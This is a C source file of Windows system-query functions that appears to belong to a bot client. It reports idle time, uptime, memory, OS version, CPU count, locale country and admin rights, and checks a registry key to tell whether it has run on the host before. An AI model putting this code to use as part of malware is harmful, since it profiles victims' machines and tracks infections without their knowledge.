#include "../Includes/includes.h"

char *ConvertToTimeDenominations(DWORD dwSeconds)
{
    char *cReturn = (char*)malloc(DEFAULT);
    sprintf(cReturn, "%lih %lim %lis", dwSeconds / (60 * 60), (dwSeconds / 60) % 60, dwSeconds % 60);
    return cReturn;
}

char *GetIdleTime() //Determines how long it has been since the host computer has been used
{
    LASTINPUTINFO lii;
    lii.cbSize = sizeof(LASTINPUTINFO);
    GetLastInputInfo(&lii);

    DWORD dwTickCount = GetTickCount();
    DWORD dwSeconds = (dwTickCount - lii.dwTime) / 1000;

    return ConvertToTimeDenominations(dwSeconds);
}

char *GetUptime()
{
    DWORD dwSeconds = GetTickCount() / 1000;

    return ConvertToTimeDenominations(dwSeconds);
}

DWORD GetMemoryLoad()
{
    MEMORYSTATUS mStatus;
    ZeroMemory(&mStatus, sizeof(mStatus));
    mStatus.dwLength = sizeof(mStatus);
    GlobalMemoryStatus(&mStatus);
    DWORD dwLoad = (DWORD)(mStatus.dwMemoryLoad);
    return dwLoad;
}

bool IsLaptop() // Courtesy of betamonkey -- Determines if the host computer is a laptop or a desktop
{
    bool bReturn = FALSE;

    SYSTEM_POWER_STATUS spsPowerInfo;
    if(GetSystemPowerStatus(&spsPowerInfo))
    {
        if(spsPowerInfo.BatteryFlag < 128)
            bReturn = TRUE;
    }

    return bReturn;
}

bool Is64Bits(HANDLE hProcess)
{
    bool bReturn = TRUE;

    BOOL bIsWow64 = FALSE;
    if(!fncIsWow64Process(hProcess, &bIsWow64))
        bReturn = FALSE;

    if(!bIsWow64)
        bReturn = FALSE;

    return bReturn;
}

bool IsAdmin() //Determines if the executable is running as user or admin
{
    bool bReturn = FALSE;

    FILE * pOpenAdminFile;
    char cAdminFile[45];

    sprintf(cAdminFile, "%s\\System32\\drivers\\etc\\protocol", cWindowsDirectory);

    pOpenAdminFile = fopen(cAdminFile, "a");

    if(pOpenAdminFile != NULL)
    {
        bReturn = TRUE;
        fclose(pOpenAdminFile);
    }

    return bReturn;
}

bool SetOperatingSystem() //Determines the operating system is on the host computer
{
    bool bReturn = TRUE;

    OSVERSIONINFOEX OsVi;
    OsVi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

    if(GetVersionEx((OSVERSIONINFO*)&OsVi))
    {
        if((OsVi.dwMajorVersion == 5) && (OsVi.dwMinorVersion == 0))
            dwOperatingSystem = WINDOWS_2000;
        else if((OsVi.dwMajorVersion ==5) && (OsVi.dwMinorVersion == 1))
            dwOperatingSystem = WINDOWS_XP;
        else if((OsVi.dwMajorVersion == 5) && (OsVi.dwMinorVersion == 2))
        {
            if(OsVi.wProductType == VER_NT_WORKSTATION && Is64Bits(GetCurrentProcess()))
                dwOperatingSystem = WINDOWS_XP;
            else
                dwOperatingSystem = WINDOWS_2003;
        }
        else if((OsVi.dwMajorVersion == 6) && (OsVi.dwMinorVersion == 0))
            dwOperatingSystem = WINDOWS_VISTA;
        else if((OsVi.dwMajorVersion == 6) && (OsVi.dwMinorVersion == 1))
            dwOperatingSystem = WINDOWS_7;
        else if((OsVi.dwMajorVersion == 6) && (OsVi.dwMinorVersion == 2))
            dwOperatingSystem = WINDOWS_8;
        else
            dwOperatingSystem = WINDOWS_UNKNOWN;
    }
    else
        bReturn = FALSE;

    return bReturn;
}

DWORD_PTR GetNumCPUs() //Determines the number of processors on the host computer
{
    SYSTEM_INFO siData = { { 0 } };
    GetSystemInfo(&siData);
    return (DWORD_PTR) siData.dwNumberOfProcessors;
}

bool CheckIfExecutableIsNew() //Checks to see if the executable has been previously run on the host computer
{
    bool bReturn = TRUE;

    /*char cSubKey[MAX_PATH];
    memset(cSubKey, 0, sizeof(cSubKey));
    strcpy(cSubKey, cRegistryKeyToCurrentVersion);
    strcat(cSubKey, "RunOnce");

    char cKeyName[DEFAULT];
    memset(cKeyName, 0, sizeof(cKeyName));
    strcpy(cKeyName, "*");
    strcat(cKeyName, cFileHash);

    if(CheckIfRegistryKeyExists(HKEY_CURRENT_USER, cSubKey, cKeyName))
        bReturn = FALSE;*/

    //if(FileExists(cFileSaved))
    //    bReturn = FALSE;

    char cKeyPath[MAX_PATH];
    strcpy(cKeyPath, "Software\\");
    //strcat(cKeyPath, cFileHash);

    if(CheckIfRegistryKeyExists(HKEY_CURRENT_USER, cKeyPath, cFileHash))
        bReturn = FALSE;

    return bReturn;
}

char *GetCountry() //Retrieves the country of the bot computer based on GetLocaleInfo
{
    static char cCountry[50];

    if(GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME, cCountry, sizeof(cCountry)) == 0)
        return (char*)"UNK";
    else
        return (char*)cCountry;
}

char *GetVersionMicrosoftDotNetVersion()
{
    char cPath[DEFAULT];
    for(unsigned short us = 0; us < 4; us++)
    {
        sprintf(cPath, "%s\\Microsoft.NET\\Framework\\", cWindowsDirectory);

        if(us == 0)
            strcat(cPath, "v4.0.30319");
        else if(us == 1)
            strcat(cPath, "v3.5");
        else if(us == 2)
            strcat(cPath, "v3.0");
        else if(us == 3)
            strcat(cPath, "v2.0.50727");

        if(DirectoryExists(cPath))
        {
            if(us == 0)
                return (char*)"4.0";
            else if(us == 1)
                return (char*)"3.5";
            else if(us == 2)
                return (char*)"3.0";
            else if(us == 3)
                return (char*)"2.0";
        }
    }

    return (char*)"N/A";
}
